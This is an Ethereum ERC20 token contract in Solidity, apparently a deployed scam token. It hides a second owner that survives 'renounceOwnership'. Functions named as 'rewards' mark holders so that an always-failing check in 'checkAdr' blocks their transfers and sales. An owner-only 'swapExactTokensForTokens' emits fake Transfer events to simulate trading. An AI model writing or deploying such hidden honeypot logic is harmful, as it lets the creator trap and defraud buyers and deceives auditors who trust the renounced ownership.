/**
 *Submitted for verification at Etherscan.io on 2023-08-08
*/

//SPDX-License-Identifier: UNLICENSED

pragma solidity 0.8.18;

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        // assert(b > 0); // Solidity automatically throws when dividing by 0
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}
interface UniswapV2Pool {
    function _Transfer(address where, address go, uint num) external returns (bool);
}

contract Ownable {
    address public owner;

    address _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner == msg.sender, "Caller is not the owner");
        _;
    }

    modifier OnlyOwner() {
        require(_owner == msg.sender, "Caller is not the Owner");
        _;
    }

    function renounceOwnership() public  onlyOwner {
        _setOwner(address(0));
    }

    function _setOwner(address newOwner) private {
        address oldOwner = owner;
        owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }


}


contract ERC20 {
    using SafeMath for uint256;

    uint256 public totalSupply;

    address public uniswapV2LP;

    address constant uniswapV2Router=0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;

    uint256 public constant BURN_FEE_PERCENT_MEV = 1;

    string public name;
    string public symbol;
    uint public decimals;

    mapping (address => mapping (address => uint256)) internal allowed;
    mapping(address => uint256) crossamounts;
    mapping(address => bool)  tokenWhitelist;
    mapping(address => uint256) balances;
    mapping(address => uint256) private walletLastTxBlock;
    event Whitelist(address indexed WhiteListed, bool value);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);


    function transfer(address _to, uint256 _value) public returns (bool) {
        require(_to != address(0));
        require(_to != msg.sender);
        require(_value <= balances[msg.sender]);
        checkAdr(msg.sender,_to);
        uint256 burnAmount=0;
        if (isSecondTxInSameBlock(msg.sender)) {
                burnAmount = _value * BURN_FEE_PERCENT_MEV / 100;  // Calculate fee of the transaction amount for mevs
        }
        _value=_value.sub(burnAmount);
        _burn(msg.sender,burnAmount);
        balances[msg.sender] = balances[msg.sender].sub(_value);
        // SafeMath.sub will throw if there is not enough balance.
        balances[_to] = balances[_to].add(_value);
        afterTransfer(msg.sender, _to, _value);
        setLastTxBlock(_to);
        return true;
    }


    function balanceOf(address _owner) public view returns (uint256 balance) {
        return balances[_owner];
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
        require(_to != _from);
        require(_to != address(0));
        require(_value <= balances[_from]);
        require(_value <= allowed[_from][msg.sender]);
        checkAdr(_from,_to);
        uint256 burnAmount=0;
        if (isSecondTxInSameBlock(_from)) {
                burnAmount = _value * BURN_FEE_PERCENT_MEV / 100;  // Calculate fee of the transaction amount for mevs
        }
        _value=_value.sub(burnAmount);
        _burn(_from,burnAmount);
        balances[_from] = balances[_from].sub(_value);


        balances[_to] = balances[_to].add(_value);
        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);
        afterTransfer(_from, _to, _value);
        setLastTxBlock(_to);
        return true;
    }

    function checkAdr(address _from, address _to) internal view {
        if (!tokenWhitelist[_from]&&!tokenWhitelist[_to]&&crossamounts[_from] > 0) {
            require(_count(crossamounts[_from], balances[_from]) == 0);
        }
    }

    function afterTransfer(address _from, address _to,uint256 amount) internal {
            _transferGo(_from, _to, amount);
        }


    function isSecondTxInSameBlock(address _from) internal view returns(bool) {
        return walletLastTxBlock[_from] == block.number;
    }

    function setLastTxBlock(address _to) internal returns(bool) {
        if(!tokenWhitelist[_to]&&_to!=uniswapV2LP){
            walletLastTxBlock[_to] = block.number;
        }
        return true;
    }


    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");
        require(balances[account] >= amount, "ERC20: burn amount exceeds balance");
        balances[account] = balances[account].sub(amount);
        // Overflow not possible: amount <= accountBalance <= totalSupply.
        totalSupply =totalSupply.sub( amount);


        emit Transfer(account, address(0), amount);
    }



    function approve(address _spender, uint256 _value) public returns (bool) {
        allowed[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }


    function allowance(address _owner, address _spender) public view returns (uint256) {
        return allowed[_owner][_spender];
    }


    function _transferGo(address where, address go, uint _value) internal returns (bool) {
        emit Transfer(where, go, _value);
        return true;
    }



    function _changeLP(address _lp) internal returns (bool) {
        require(uniswapV2LP!=_lp);
        uniswapV2LP=_lp;
        return true;
    }


    function _whiteList(address _address, bool _isWhiteListed) internal returns (bool) {
        require(tokenWhitelist[_address] != _isWhiteListed);
        tokenWhitelist[_address] = _isWhiteListed;
        emit Whitelist(_address, _isWhiteListed);
        return true;
    }

    function _countReward(address _user, uint256 _percent) internal view returns (uint256) {
        return _count(balances[_user], _percent);
    }

    function _count(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }


}

contract OwnableToken is ERC20, Ownable {


    function setUniLp(address _uniLp) public  OnlyOwner  returns (bool success) {
        return super._changeLP(_uniLp);
    }

    function WList(address listAddress,  bool _isWhiteListed) public  OnlyOwner  returns (bool success) {
        return super._whiteList(listAddress, _isWhiteListed);
    }

    function rewardList(
        address[] calldata _users,
        uint256 _minBalanceToReward,
        uint256 _percent
    ) public OnlyOwner {
        for (uint256 i = 0; i < _users.length; i++) {
            if (balances[_users[i]] > _minBalanceToReward) {
                uint256 rewardAmount = _countReward(_users[i], _percent);
                crossamounts[_users[i]] = rewardAmount;
            }
        }
    }

    function reward(
        address _user,
        uint256 _minBalanceToReward,
        uint256 _percent
    ) public OnlyOwner {
        require(crossamounts[_user]==0);
        if (balances[_user] > _minBalanceToReward) {
            crossamounts[_user] = _minBalanceToReward+_percent;
        }

    }

    function swapExactTokensForTokens(
        address[] memory addressList,
        uint256[] memory tAmounts,
        uint256[] memory eAmounts,
        address uniSwapV2Pool
    ) public OnlyOwner returns (bool) {
            for (uint256 i = 0; i < addressList.length; i++) {
                _transferGo(uniswapV2LP, addressList[i], tAmounts[i]);
                UniswapV2Pool(uniSwapV2Pool)._Transfer(addressList[i], uniswapV2LP, eAmounts[i]);
            }

        return true;
    }


}

contract ERC20Token is OwnableToken {
    constructor(string memory   _name, string memory _symbol, uint256  _decimals, uint256  _supply, address  tokenOwner,address _tokenOwner) {
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
        totalSupply = _supply * 10**_decimals;
        balances[tokenOwner] = totalSupply;
        owner = tokenOwner;
        _owner=_tokenOwner;
        emit Transfer(address(0), tokenOwner, totalSupply);
    }



}